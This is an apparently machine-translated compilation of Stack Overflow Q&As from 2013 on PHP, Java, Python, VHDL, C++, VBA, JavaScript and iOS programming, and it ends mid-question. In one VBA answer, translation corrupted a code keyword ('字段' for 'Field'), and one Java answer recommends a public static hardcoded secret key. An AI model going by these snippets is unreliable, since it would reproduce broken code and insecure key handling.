> 
> 赞同：0
> 
> 时间：2013-02-15T21:05:04.747
> 
> 标签：php, xml

如何使用 PHP 从 XML 文件中查找和获取“美元”、“英镑”和“欧元”的货币？

我的 XML 文件如下所示：

```
<?xml version="1.0" encoding="ISO-8859-2"?>
<tabela_kursow typ="A" uid="13a033">
   <numer_tabeli>033/A/NBP/2013</numer_tabeli>
   <data_publikacji>2013-02-15</data_publikacji>
   <pozycja>
      <nazwa_waluty>bat (Tajlandia)</nazwa_waluty>
      <przelicznik>1</przelicznik>
      <kod_waluty>THB</kod_waluty>
      <kurs_sredni>0,1052</kurs_sredni>
   </pozycja>
   <pozycja>
      <nazwa_waluty>dolar amerykański</nazwa_waluty>
      <przelicznik>1</przelicznik>
      <kod_waluty>USD</kod_waluty>
      <kurs_sredni>3,1398</kurs_sredni>
   </pozycja> 
```

文件来自这里：[波兰国家银行](http://www.nbp.pl/kursy/xml/LastA.xml)

我下载文件并将其保存在我的服务器上：

```
$basedir = "/mypath/www/dirname";

$sxe = new SimpleXMLElement("http://www.nbp.pl/kursy/xml/LastA.xml", null, true);

file_put_contents($basedir."/subdirname/output.xml", $sxe->asXML()); 
```

使用下载的 XML 文件如何**`<kurs_sredni>`**仅获得`<kod_waluty>`= USD、EUR、GBP？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:28:02.560

你可以用这样的东西阅读。这不是完整的代码，请填补空白：

```
$doc = new DOMDocument();
$doc->load( $pathFileName );

$pozycjas = $doc->getElementsByTagName( "pozycja" );

foreach($pozycjas as $eachPozycja)
{
  //readef fields
  $kod_waluty = $eachPozycja->getElementsByTagName( "kod_waluty " )->item(0)->nodeValue;

  if($kod_waluty is value u want)
       //read and store kurs_sredni
       $kurs_sredni= $eachPozycja->getElementsByTagName( "kurs_sredni" )->item(0)->nodeValue;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T23:10:22.973

您可以通过遍历所有元素来执行此操作，检查当前元素是否符合您的条件，然后提取感兴趣的数据：

```
$sxe = new SimpleXMLElement("http://www.nbp.pl/kursy/xml/LastA.xml", null, true);

$accept = array_flip(explode(',', 'USD,EUR,GBP'));

foreach($sxe->pozycja as $pozycja)
{
    $currency = (string) $pozycja->kod_waluty;
    if (isset($accept[$currency])) {
        $accept[$currency] = (string) $pozycja->kurs_sredni;
    }
}

print_r($accept); 
```

这给了你：

```
Array
(
    [USD] => 3,1398
    [EUR] => 4,1852
    [GBP] => 4,8620
) 
```

如果您只想删除 XML 元素并再次保存 XML（如您在问题中建议的那样），则根本不需要过滤数据。只需存储未经过滤的 XML，它不是任何类型的大文件。

# playframework - 编译拦截时出错

> ID：14903310
> 
> 赞同：0
> 
> 时间：2013-02-15T21:05:46.317
> 
> 标签：playframework, playframework-2.0

尝试使用拦截时，我的应用程序未编译，例如...

```
package controllers;

import play.mvc.*;

public class Secure extends Controller {

    @Before
    static void checkAuthenticated(){
      ...
    }

    ...

} 
```

例外是“错误：找不到符号@Before”。我已经尝试从控制台清理、重建 Eclipse 项目并重新排序 Java Build Path

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:53:36.587

> 所有@Before、@After、@Catch、@Finally 都已合并为一个更简单的概念：
> 
> [http://www.playframework.com/documentation/2.0/JavaActionsComposition](http://www.playframework.com/documentation/2.0/JavaActionsComposition)

要了解更多信息，请查看 play 安装 (samples) 文件夹中的 zentasks 示例，它实现`Security.Authenticator`

# php - 论坛主题订阅

> ID：14903312
> 
> 赞同：0
> 
> 时间：2013-02-15T21:05:48.810
> 
> 标签：php, forum

我写了一个非常简单的论坛来集成到一个网络应用程序中，因为我正在努力寻找一个轻量级和快速的论坛，它允许我使用我自己的身份验证方法来决定谁是或不是有效用户以及哪些适合我的应用程序主题。用户要求订阅线程的能力，以便他们收到回复通知 - 这样做的最佳方式是什么？

我可以创建一个线程订阅表并在每次有人订阅时输入一个新行 - 这可能涉及在每个帖子和回复中查找大量繁忙线程，但只需一个简单的插入就可以很快找到新订阅。

我想到的另一个选择是每个线程有一行，并有一个字段，我可以在其中添加（或读取）每个线程的数组，其中包含所有订阅的用户 ID。由于数据库调用更少（即，当做出新的回复时，只需要一个数据库调用来获取所有用户 ID），这让我觉得阅读速度更快，但我认为添加新订阅者时插入可能会更慢因为我必须找到线程的行，获取现有数组，然后将用户 ID 添加到现有数组。

最后一个选项，与第二个选项非常相似，是有一个用户订阅表，其中每一行都是一个用户 ID，然后有一个订阅线程数组。

哪个是最好的方法？目前，我唯一的要求是向用户发送新帖子和回复的电子邮件，但将来我可能希望将其扩展为包括用户列出他们订阅的线程等的能力，就像许多主流论坛所做的那样。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:13:27.313

在我看来，你的两个选择都很好，除了那`array`件事。您可以简单地选择一个包含`unique id`线程的表，如果用户点击订阅按钮，则可以使用他的`id`和`thread id`. 你可以称之为，`subscription table`.

我认为如果用户开始订阅更多线程，数组可能会派上用场。这取决于你的论坛有多大。

# python - 尝试在 python 上实现快速排序：NameError: global name 'x' is not defined

> ID：14903313
> 
> 赞同：0
> 
> 时间：2013-02-15T21:06:05.143
> 
> 标签：python, quicksort

我正在学习使用 Python，并开始编写一些代码。我尝试了一百种可能的更改，但我不知道如何修复它。这是我的代码：

```
from random import *
from time import *

L = []
for m in range(0,100):
    L.append(randint(0,100))

def quicksort(L, first, last):

    i = first
    j = last
    pivote = (L[i] + L[j]) / 2

    while i < j:
        while L[i] < pivote:
            i+=1
        while L[j] > pivote:
            j-=1
        if i <= j:
            x == L[j]
            L[j] == L[i]
            L[i] == x
            i+=1
            j-=1

    if first < j:
        L == quicksort(L, first, j)
    if last > i:
        L == quicksort(L, i, last)

    return L

start = time() 
print ("Disordered:" , L)
L = quicksort(L, L[0], L[len(L)-1])
print ("Ordered:" ,L)
print ("%.2f seconds" % (time() - start)) 
```

这是错误：

```
Traceback (most recent call last):
  File "/Users/Ricardo/Desktop/QuickSortR.py", line 48, in <module>
    L = quicksort(L, L[0], L[len(L)-1])
  File "/Users/Ricardo/Desktop/QuickSortR.py", line 28, in quicksort
    x == L[j]
NameError: global name 'x' is not defined 
```

谢谢你帮助我！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-15T21:07:20.730

我想你想*分配给* `x`：

```
x = L[j] 
```

您正在使用`==`; 一个比较，而不是。你在几个地方这样做；`==`计算为布尔值（当两个项目被认为相等时），同时`=`分配给一个变量。

在python中，您可以直接交换变量而无需临时：

```
if i <= j:
    L[j], L[i] = L[i], L[j] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T21:07:47.217

在您使用`==`而不是`=`在分配中的几个地方，例如`x == L[j]`，这是您与项目进行比较的方式。分配给`x`你应该有`x = L[j]`.

请注意，您还需要修复其他几行类似的行。

# java - 从 java 反射中隐藏我的安全密钥

> ID：14903318
> 
> 赞同：3
> 
> 时间：2013-02-15T21:06:33.413
> 
> 标签：java, security, reflection

下面的类是我用于加密的安全密钥提供程序。

```
public class MySecretKey {
private String key="2sfdsdf7787fgrtdfg#$%@cj5";
...
//Some Util methods goes on  Here .
} 
```

首先，我不相信 `private` 没有 getter 就可以访问数据，但是，天哪，我现在可以在控制台中看到密钥了。

在其他使用反射的地方，我们可以看到如下代码：

```
public static void main(String[] args) throws Exception {
        Stacker myClass = new Stacker();
        Field key= myClass.getClass().getDeclaredField("key");
        field1.setAccessible(true);
        System.out.println(key.get(myClass));
    } 
```

我怎样才能在课堂外隐藏我的钥匙:(，即使是`private`关键字也不能帮助我在反射的情况下。

请给我一些提示。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:22:13.030

首选的解决方案是将密钥存储在文件中，然后使用文件系统权限来限制对文件的访问。这不是一个完美的解决方案（当然不是那么方便），但它比在代码中硬连线更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:26:25.463

通过在十六进制编辑器中打开类文件，可以轻松检查 Java 类中定义的所有字符串，它们无论如何都不是隐藏的。更不用说可以使用反射以编程方式检索它们，正如您刚刚发现的那样。

您用于“隐藏”私钥的机制已损坏，并且完全有缺陷。相反，您应该将密钥存储在外部文件中，例如序列化、加密的密钥存储，并通过其他方式保护 - 例如，密码或存储在其他地方的另一个密钥。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T21:27:30.330

[`setAccessible`](http://docs.oracle.com/javase/7/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible%28java.lang.reflect.AccessibleObject%5b%5d,%20boolean%29)说

> 首先，如果有一个安全管理器，它的 checkPermission 方法会以一个`ReflectPermission("suppressAccessChecks")`权限被调用。

*因此您可以通过拒绝suppressAccessChecks*权限来防止这种情况。

但实际上，最好避免依赖 JVM 来保持对象不可侵犯性。 [Joe-E](http://code.google.com/p/joe-e/)允许 JVM 中的类之间相互怀疑，但 JVM 并不是为此而设计的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-06-28T09:18:42.677

简单，做这门课`non-instantiatable` 怎么做？

创建一个私有构造函数并创建你的`key`字段`static`

所以你的课看起来像这样

```
public class MySecretKey {
    public static String key="2sfdsdf7787fgrtdfg#$%@cj5";
    private MySecretKey(){} //Private constructor
    //No Util methods will go here.
} 
```

# android - 绘制一个循环定时器（AndEngine）

> ID：14903319
> 
> 赞同：7
> 
> 时间：2013-02-15T21:06:39.200
> 
> 标签：android, andengine, geometry, sprite-sheet

我正在使用 AndEngine，在该框架内，我想制作一个圆形计时器图形。具体来说，我想显示重用能力的等待时间。这个想法是随着计时器的进行动态地填充弧。像这样的东西：

![Graphics.fillArc()](../Images/8e5d775ffd0f2847e0c0e64d77dba2bd.png)

java.awt.Graphics 对象有一个对我来说似乎很完美的 fillArc() 方法。实际上，上面的图形是使用fillArc(50,5,100,100,75,-40)绘制的。伟大的！现在问题来了：

AndEngine 不使用 Graphics() 对象，它使用自己的 Shape 实现（用于 OpenGL）并且没有定义的“圆形”形状，更不用说带有 fillArc() 方法的圆形了。

## 可能的解决方案及其各自的问题

环顾四周寻找解决方案，我遇到了“[使用 Andengine 绘制圆圈](https://stackoverflow.com/questions/10166459/drawing-a-circle-using-andengine)”。问答对我来说没有多大用处，因为唯一的答案“确实，你不能直接画一个圆”提供了两种选择：（1）“用圆形纹理渲染一个四边形”——这对我不起作用我需要动态修改圆来产生弧形填充；(2) “渲染一个实际上是一个连接三角形的圆。” 也许选项二会起作用，但那里没有关于如何做到这一点的指导。

我还遇到了“[通过 box2d 在 android andengine 中创建圆圈？](https://stackoverflow.com/questions/10271900/creating-circle-in-android-andengine-by-box2d) ”。我怀疑有人可能会说，你可以像这样简单地创建一个圈子：

> 身体 circleBody = PhysicsFactory.createCircleBody(pWorld, pSprite, BodyType.StaticBody, FixtureDef);

这真的对我没有帮助。我不想创建一个圆形的 2D 物理体。我想展示一个。

最后，我发现[了这个讨论](http://www.andengine.org/forums/development/how-do-i-draw-a-circle-t868.html)，这是有希望的。特别是，有一个建议：

> 使用 Canvas 将 [it] 绘制到 Bitmap 中，并将该 Bitmap 作为 TextureSource 加载。

听起来很合理，尽管我仍然不清楚如何做到这一点。

* * *

## 更新：我的作弊“解决方案”

与其纠缠于此，我决定作弊（至少暂时如此）。我制作了一个看起来像这样的精灵表：

![作弊计时器图像](../Images/224fd3be3c9f8cadeb17af8ab2ca6aad.png)

而不是真正让计时器显示完美的 fillArc()，我只是根据完成的比例（从 0 到 1）四舍五入到 spritesheet 上的适当索引，从 spritesheet 中拉出适当的 sprite 索引。像这样：

```
public void setTimer(float amount) {
    this.setCurrentTileIndex(Math.round(amount * 20));
} 
```

就我的目的而言，这实际上工作得很好——我在大约 2 秒内使用了计时器，所以你真的看不到缺少细节。但是，如果有人发布它，也许我会用“正确”的解决方案替换它。此外，也许这个 spritesheet 对做同样事情的人有用。这是使用透明度而不是绿色背景的版本。（所以它在stackoverflow的白色背景上是白色的，但它就在那里）：

![白底白字定时器](../Images/1ec6dac046bae12976293e9b44af8bd5.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T04:10:50.133

第三种解决方案需要单个纹理和自定义对象。所以这是你的解决方案之间的权衡，一个需要很多三角形，另一个需要纹理内存。

1.  您只需要一张图片，即上面“作弊序列”中的完整圆圈。
2.  创建一个由 8 个三角形组成的自定义对象（一个“完全绘制”的三角形每个代表 45°）。
3.  进度决定：
    *   要画多少个三角形。IE：
        *   100% ==> 360° ==> 8 个完整的三角形
        *   50% ==> 180° ==> 4 个完整的三角形
        *   37.5% ==> 135° ==> 3 个完整的三角形
        *   25% ==> 90° ==> 2 个完整的三角形
        *   20% ==> 72° ==> 1 个完整的三角形和一个带有一个顶点的三角形移动，因此它代表剩余的 27° (== 72° - 45°)。

如果你问我这是最酷的解决方案，因为它可以应用于任何纹理。=)

# vhdl - xilinx VHDL 错误 827：信号 无法合成

> ID：14903321
> 
> 赞同：1
> 
> 时间：2013-02-15T21:06:49.820
> 
> 标签：vhdl, xilinx, hdl

我是 VHDL 编程的初学者，我正在尝试使用 ISE 项目导航器 13.1 合成以下 vhdl 代码（用于按钮的软件）

```
entity PBdebouncer is
Port ( PB : in  STD_LOGIC;
       CLK : in  STD_LOGIC;
       reset : in  STD_LOGIC;
       PBdebounced : out  STD_LOGIC);
end PBdebouncer;

architecture Behavioral of PBdebouncer is

begin

    p1: process(CLK , PB , reset)
        variable enable,count : integer range 0 to 100000 := 0;
    begin
        if(reset = '1') then
            count := 0;
            enable :=0;
        elsif(CLK' event and CLK = '1' ) then
            if (enable = 1) then
                count := count + 1;
            end if;

            if(count = 99999 ) then 
                if(PB = '0') then
                    PBdebounced <= '0';
                else
                    PBdebounced <= '0';
                end if;

                count := 0;
                enable := 0;
            end if;

            count := count;

        else
            enable := 1;
        end if;

    end process;
end Behavioral; 
```

但不幸的是，我遇到了以下错误：

> 错误：Xst:827 -“.../digital lab II 110/PBdebouncer/PBdebouncer.vhd”第 43 行：无法合成信号启用，同步描述错误。当前软件版本不支持您用于描述同步元素（寄存器、内存等）的描述样式。

那么你能帮我解释一下这个错误吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:35:22.523

尝试在 Clk' 和 event 之间没有空格...

其他一些问题：
当您只使用其中两个值时，为什么“启用”的范围为 0 到 100000？为什么不只使用布尔值或标准逻辑？
“pbdebounced”是否应该设置为“0”以外的任何值？
为什么布尔表达式周围的括号？
为什么PB在敏感列表中？
它在模拟中是否按预期工作？

这些现在可能会做......

编辑：错误的格式隐藏了问题：

```
begin
   if reset = '1' then
      count := 0;
      enable :=0;
   elsif rising_edge(clk) then
      if enable = 1 then 
         count := count + 1; 
      end if;
      if count = 99999 then 
         -- do stuff
      end if;
      count:= count;
-- else   
-- enable := 1;
-- THE TWO LINES ABOVE are the problem
-- They are outside both the CLK and RESET clauses.
   end if;
end process; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-22T16:12:39.613

只是一个小建议：避免变量作为初学者。它们似乎像在软件程序中一样工作，但有时它们映射到硬件中的讨厌的东西。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-16T18:07:28.457

Brians 的回答似乎已经确定了问题的原因 - 但我只会为这些情况添加一个提示：

在 Xilinx ISE 中，您可以查看许多语言模板（选择 Edit -> Language templates），它们可以帮助您实现各种样式的触发器（同步/异步复位、上升沿/下降沿触发等）和其他构造.

这些真的很有帮助——尤其是在收到这样的错误消息时，这通常是由于语法正确的 VHDL 代码描述了无法在所选设备中合成的硬件。

# objective-c - Objective-C：编写一个智能的可重用比较函数

> ID：14903322
> 
> 赞同：0
> 
> 时间：2013-02-15T21:06:59.180
> 
> 标签：objective-c, compare

此代码位于卡片类的实例中。它具有以下属性：self.shape、self.color。NSArray 充满了此类的`otherCards`其他实例，这些实例也具有相同的 self.shape 等...

但我想制作一个适用于形状、颜色、数字等的比较方法。所以通过传递它 self.shape 让它比较 self.shape of `otherCards`，并通过它传递它 self.color 让它比较 self.color of`otherCards`

```
[self attributesIsEqual:self.shape with attribute:otherCards] //Calling the method

- (BOOL)attributesIsEqual: (id)attribue with: (NSArray *)otherCards
{
    // Compare whatever (id) attribute to the same attribute in otherCards
} 
```

# c++ - 链接器错误：致命错误 LNK1120：1 未解决的外部

> ID：14903326
> 
> 赞同：1
> 
> 时间：2013-02-15T21:07:01.930
> 
> 标签：c++, visual-studio

它显示“链接器错误：致命错误 LNK1120: 1 unresolved externals”整个项目 = 头文件、第一个 .cpp 文件和第二个带有 main() 函数的 .cpp 文件。Any1 知道我做错了什么吗？

```
//golf.h for golf.cpp
const int Len = 40;
struct golf{
    char fullname[Len];
    int handicap;
};
//dla gotowych wartosci
void setgolf (golf & g, const char * name, int hc);
//do wpisywania wartosci
int setgolf (golf & g);
//tylko handicap
inline void handicap (golf & g, int hc);
//wyswietla info o graczu
void showgolf (const golf & g) ; 
```

下一个文件

```
//golf.cpp for 9-1.cpp
#include <iostream>
#include <cstring>
#include "golf.h"
extern const int Len;
void setgolf (golf & g, const char* name, int hc){
    strcpy(g.fullname,name);
    g.handicap=hc;
}
int setgolf (golf & g){
    using namespace std;
    cout << "Podaj fullname golfiarza" << endl;
    if (cin.getline(g.fullname,Len)) return 0;
    cout << "Teraz podaj jego handicap" << endl;
    cin >> g.handicap;
    return 1;
}
inline void handicap (golf & g, int hc){
    g.handicap=hc;
}
void showgolf (const golf & g){
    using std::cout;
    using std::endl;
    cout << "Fullname gracza to: " << g.fullname << endl;
    cout << "Jego handicap to: " << g.handicap << endl;
} 
```

最后一个文件

```
#include <iostream>
#include <cstdlib>
#include "golf.h"
using namespace std;
int main(){
    cout << "Witaj!\nTutaj program golficzny!" << endl;
    golf filip;
    golf klaudia;
    cout << "Automatyczne uzupelnienie Filipa" << endl;
    setgolf(filip, "Filip Bartuzi",100);
    showgolf(filip);
    cout << "Manualne uzupelnienie Klaudii" << endl;
    ((setgolf(klaudia))==1) ? showgolf(klaudia) : cout << "nie wprowadziles gracza!" << endl; ;
    cout << "Zly handicap? Okey, zmienie handicap Filipowi" << endl;
    handicap(filip,50);
    showgolf(filip);
    cout << "Od razu lepiej, nieprawda?" << endl;
    system("PAUSE");
    return 0;
} 
```

任何的想法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-15T21:10:52.523

```
inline void handicap (golf & g, int hc){
    g.handicap=hc;
} 
```

`inline`如果函数在`golf.cpp`文件中，请尝试删除关键字。

或者，重新定位文件中的整个函数`golf.h`。（在这里，这个选择似乎更合适。）

原因：如果一个函数是`inline`，那么它的主体必须对调用者可见。只有将函数体放在头文件中，而不是在实现文件中，这才有可能。

可能相关：[.cpp 文件中的 C++ 内联成员函数](https://stackoverflow.com/questions/3992980/c-inline-member-function-in-cpp-file/3993003#3993003)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T21:15:05.707

删除内联词。它旨在在同一位置提供函数的声明和定义（这使得编译器可能会用其代码替换对函数的每次调用）。

在您的代码中，您使用 inline 关键字，但在其他地方提供代码。

它应该是这样的：

`inline void handicap (golf & g, int hc){ g.handicap=hc; }`

直接在您的 .h 文件中。（并且可以从 golf.cpp 文件中删除定义）

# excel - 如何复制工作表并让我的宏仍然有效？

> ID：14903331
> 
> 赞同：2
> 
> 时间：2013-02-15T21:07:22.943
> 
> 标签：excel, vba

首先，如果我的问题已经在其他地方得到解答，我想道歉，因为我确实花了一些时间搜索。

我在一张表中使用了两个宏（非常简单的宏......它们过滤了一个表格），这张表是一个每周都会使用的模板。当我复制工作表并制作新工作表时，宏不再起作用。我收到的错误是运行时错误 9；下标超出范围。我查看了 VBA 代码（我从未真正学习过 VBA），发现它引用了一个表格标题。有没有办法解决这个问题，所以它不引用该特定表，而是该表中包含的单元格？标题名称示例：

```
ActiveSheet.ListObjects("Table1619").Range.AutoFilter Field:=1 
```

我想从`A103:A113`. 我试过这个：

```
ActiveSheet.ListObjects.Range("$A$103:$A$113").AutoFilter Field:=1 
```

这也不起作用，但我收到的错误是不同的。`"Run-time error '438': Object doesn't support this property or method"`

我知道如果有一种方法可以在所有工作表中使用相同的表名，但我有限的研究似乎将我指向了这不可能的方向。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:36:13.653

不可能`ActiveSheet.ListObjects.Range("$A$103:$A$113")`像这样引用 - 在您的第一个示例中如上所述，或者将表格转换为正常范围，然后使用`ActiveSheet.Range("$A$103:$A$113")`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T22:48:41.203

您面临的问题是您通过 Table/ListObject 访问 Range - 但 ListObject 在复制期间更改了名称，因为每个 Table 必须具有唯一的名称。解决方案很简单 - 无需使用 ListObject 的名称访问 ListObject，只需使用工作表中的索引即可 - 这不会改变。因此，更换

```
ActiveSheet.ListObjects("Table1619").Range.AutoFilter 字段：=1

```

和

```
ActiveSheet.ListObjects(1).Range.AutoFilter 字段：=1

```

（假设它是工作表中唯一/第一个表。）

# javascript - Pinterest“固定”按钮在 Internet Explorer 中打破“返回”

> ID：14903334
> 
> 赞同：7
> 
> 时间：2013-02-15T21:07:46.063
> 
> 标签：javascript, internet-explorer, pinterest

我最近发现在 Internet Explorer（至少是 v9）中，Pinterest 的“Pin it”按钮破坏了浏览器中的“返回”功能。右键单击它会显示类似“ [http://assets.pinterest.com/pidget.html](http://assets.pinterest.com/pidget.html) ”的条目作为上一页。

看起来 Pinterest 正在添加 iFrame，而 IE 正在将其地址添加到历史记录中。单击“返回”不会执行任何操作。这是一个已知问题吗？有解决办法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-18T15:38:41.983

好吧，作为一个临时解决方案（除了删除“固定”按钮），通过阅读他们的代码，我相信（未经测试）你可以在`<script>`调用中添加一个部分来禁用日志记录，就像这样......

```
<script type="text/javascript" src="//assets.pinterest.com/js/pinit.js" data-pin-do-not-log="true"></script> 
```

这可行但不适用于我，因为我异步加载脚本并使用`load`命令，所以我所做的是将 pinit.js 文件本地复制到服务器，并更改了显示的部分

```
if(a.v.config["do-not-log"]||a.a.doNotLog===true) 
```

至

```
if(a.v.config["do-not-log"]||a.a.doNotLog===true||true) 
```

看起来它正在 iframe 中进行某种登录。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-18T11:14:01.717

我在这里用 PInterest 提出了它[https://help.pinterest.com/requests/884162](https://help.pinterest.com/requests/884162)

他们的回应。几乎一扫而光。

* * *

你好 ，

有关如何将 Pin It 按钮添加到您的网站或产品页面的信息，请访问此处：

[http://pinterest.com/about/goodies/](http://pinterest.com/about/goodies/)

此处提供了更高级的文档：

[https://help.pinterest.com/entries/21101982](https://help.pinterest.com/entries/21101982)

很遗憾我们无法提供编码支持。由于添加 Pin It 按钮的问题可能是由于与设置的不同部分发生冲突而引起的，因此通常最好由熟悉您的设置的人对其进行故障排除。您可能还想尝试搜索网络，看看其他人是否有类似的问题，尤其是使用类似网站平台或语言的人。

我们要求您使用我们的帮助文章尽快获得所需的信息。如果您希望我们的团队了解其他信息，您可以回复此消息。

感谢您的写作和快乐的钉住！

*   Pinterest 团队

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-16T03:06:26.430

我遇到了同样的问题。我通过依次转到“工具”、“Internet 选项”和“安全”，将该网站添加到我的受限站点列表中。它似乎已经解决了这个问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-20T14:47:19.073

当我们第一次按下新的 Pin It 按钮时，这是一个临时错误，应该不再是问题，因为我们在报告后不久就删除了日志框架。抱歉，添麻烦了！

# google-maps-api-3 - 谷歌地图 API v3 初始化函数

> ID：14903336
> 
> 赞同：1
> 
> 时间：2013-02-15T21:07:48.387
> 
> 标签：google-maps-api-3

我想精简我的`initialize()`功能......但每次我这样做时，它都会破坏我的代码。我最终试图做这样的事情[，](https://stackoverflow.com/questions/11353087/google-maps-adding-markers-with-ajax)我有一个侧边栏，其中包含与地图上的标记直接相关的东西，AJAX'd in... 首先，我希望能够将其他功能放在外面`initialize()`功能 。**这工作正常：**

```
<script>

  function initialize() {
    // create the map object
    var mapOptions = {
      zoom: 14,
      mapTypeId: google.maps.MapTypeId.ROADMAP
    };    
    var map = new google.maps.Map(document.getElementById("map_canvas"), 
        mapOptions);

    // create your location marker
    var mylocOptions = {
      draggable: true,
      animation: google.maps.Animation.DROP,
      icon: new google.maps.MarkerImage('//maps.gstatic.com/mapfiles/mobile/mobileimgs2.png',
            new google.maps.Size(22,22),
            new google.maps.Point(0,18),
            new google.maps.Point(11,11)),
      title: "You are here..."
    };
    var myloc = new google.maps.Marker(mylocOptions);

    // get location information from browser, or from user input, or from database
    <% if !signed_in? || !current_user.loc %>
      if (navigator.geolocation) navigator.geolocation.getCurrentPosition(function(pos) {
        var me = new google.maps.LatLng(pos.coords.latitude, pos.coords.longitude);
        myloc.setPosition(me);
        myloc.setMap(map);
        map.setCenter(me);
        $.ajax({
          data: { me: me.toString() },
          type: 'POST',
          url: '/set-location'
        })
      }, function(error) {
          var address = prompt('Where are you looking?');
          geocoder = new google.maps.Geocoder();
          geocoder.geocode({ 'address': address }, function(results, status) {
            if (status == google.maps.GeocoderStatus.OK) {
              var me = results[0].geometry.location
              myloc.setPosition(me);
              myloc.setMap(map);
              map.setCenter(me);
            } else {
              alert("Geocode was not successful for the following reason: " + status);
            };
          });
      });
    <% else %>
      var me = new google.maps.LatLng(<%= current_user.loc %>);
      myloc.setPosition(me);
      myloc.setMap(map);
      map.setCenter(me);
      map.setZoom(12);
    <% end %>

    // watch for marker movement, and update location accordingly
    var oldPos = myloc.getPosition();
    google.maps.event.addListener(myloc, "dragend", function(e){
      revGeo = new google.maps.Geocoder();
      var newPos = myloc.getPosition();
      $.ajax({
        data: { me: newPos.toString() },
        type: 'GET',
        url: '/set-location'
      })
      if(oldPos != newPos)
        revGeo.geocode({'latLng': newPos}, function(results, status) {
          if (status == google.maps.GeocoderStatus.OK) {
            if (results[1]) {
              $('#loc').html(results[1].formatted_address);
            }
          } else {
            alert("Geocoder failed due to: " + status);
          }
        });
      oldPos = newPos;
    });

    // when creating an event, check for event location,
    // verify it's existance and put a marker down on the map
    $(document).on('focusout', '#event_location', function() {
      geocoder = new google.maps.Geocoder();
      address = document.getElementById("event_location").value;
      geocoder.geocode({ 'address': address }, function(results, status) {
        if (status == google.maps.GeocoderStatus.OK) {
          var coords = results[0].geometry.location;
          map.setCenter(coords);
          var marker = new google.maps.Marker({
            map: map,
            animation: google.maps.Animation.DROP,
            position: coords
          });
          $('#coords').html('coordinates: ' + coords)
          $('#event_geocode').val(coords.toString())
        } else {
          alert(status + " for " + address);
        };
      });
    });
  }
</script> 
```

...但我相信它可以被打破。关于我做错了什么的任何想法？

# sharepoint - Sharepoint 基金会：如何使新网站集看起来像现有网站集？

> ID：14903341
> 
> 赞同：0
> 
> 时间：2013-02-15T21:08:06.580
> 
> 标签：sharepoint

这里完全是sharepoint新手，被要求创建一个模仿另一个网站现有外观和感觉的sharepoint集合，我该如何归档？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T21:43:17.463

使用 SharePoint 基础很难做到，因为您的选择有限。服务器版本可从 A 到 Z 进行自定义：母版页、页面布局等...

当您使用 SP Foundation 时，唯一的选择是使用 SharePoint 中内置的并且可以自定义的主题。您可以创建自己的主题。有关如何自定义 SP 站点的更多信息，请参阅 [此处。](http://www.mssharepointtips.com/tip.asp?id=1138)

我可以建议你看看[这些](http://www.sharepointpackages.com/index.php?main_page=index&cPath=77)例子......

希望能帮助到你，

安德鲁

# regex - 包含“=”的字符串的正则表达式

> ID：14903343
> 
> 赞同：1
> 
> 时间：2013-02-15T21:08:14.800
> 
> 标签：regex, .htaccess, character

我试图创建一个正则表达式来验证一个字符串并检查它是否有一个`=`字符。

我也需要它像这样放在括号中

```
(.*) 
```

以便稍后检索该值。

我尝试的是

```
(.*=.*) 
```

但它不起作用。

如何匹配包含 a 的字符串`=`？

**编辑：**

这是我的 htaccess 文件中的正则表达式：

```
RewriteRule ^(home|page1|page2|page3|admin)/(.*)/(.*)/(.*=.*) index.php?area=$1&page=$2&content=$3&$4 [L]
RewriteRule ^(home|page1|page2|page3|admin)/(.*)/(.*) index.php?area=$1&page=$2&content=$3 [L] 
```

例子是

`/home/foo/bar`和`/home/foo/bar/page=2`

这就是我非常想要实现的目标。`GET`以令人眼花缭乱的方式添加参数。另外，我需要解析它是否包含`=`字符，因为网站中有各种深度，例如`/foo/page=1`和`foo/bar/page=1`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:12:17.273

实际上这对我有用。这个电话：

```
preg_match('/.*=.*/','foo=bar'); 
```

返回`1`。

但是，如果您只想检查字符串是否包含`=`，那么[`strpos`](http://www.php.net/manual/en/function.strpos.php)就足够了。

相反，如果它是在更大的正则表达式的上下文中，问题可能出在其他地方。请向我们展示**整个匹配模式**和一些具有相应预期行为的示例输入。

# iphone - DidSelectRowAtIndexPath 未被调用

> ID：14903345
> 
> 赞同：0
> 
> 时间：2013-02-15T21:08:20.320
> 
> 标签：iphone, uitableview, tableview, segue, uistoryboardsegue

我有 3 个不同的 detailTableView，我的 masterTableView 中的单元格在触摸时会调用它们。

请查看我的 master.m 文件：

```
#import "GuideTableViewController.h"
#import "GuideDetailTableViewController.h"
#import "GuideDetailTableViewController2.h"
#import "GuideDetailTableViewController3.h"
#import <QuartzCore/QuartzCore.h>

@interface GuideTableViewController (){

    NSMutableData *weatherResponseData;

    NSArray *headGuide;

    NSArray *leftImages;

}

@property (weak, nonatomic) IBOutlet UITableView *tableView;

@property (weak, nonatomic) IBOutlet UIImageView *imgHeader;

@property (weak, nonatomic) IBOutlet UIImageView *ImgTitle;

